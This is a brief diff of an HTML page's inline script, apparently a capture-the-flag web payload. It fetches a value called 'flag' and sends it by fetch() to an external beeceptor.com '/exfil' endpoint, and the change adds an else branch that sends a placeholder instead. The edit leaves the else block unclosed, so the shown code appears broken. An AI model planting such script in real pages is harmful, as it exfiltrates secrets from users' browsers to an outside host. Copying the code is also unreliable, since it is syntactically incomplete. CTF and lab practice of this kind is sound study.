@@ -10,7 +10,7 @@
     const flag = await res.text();
 
     fetch('https://webtest.free.beeceptor.com/exfil?f=' + encodeURIComponent(flag));
-  }
-  fetch('https://webtest.free.beeceptor.com/exfil?f=' + 'rien');
+  } else {
+    fetch('https://webtest.free.beeceptor.com/exfil?f=' + 'rien');
 })();
 </script></body></html>
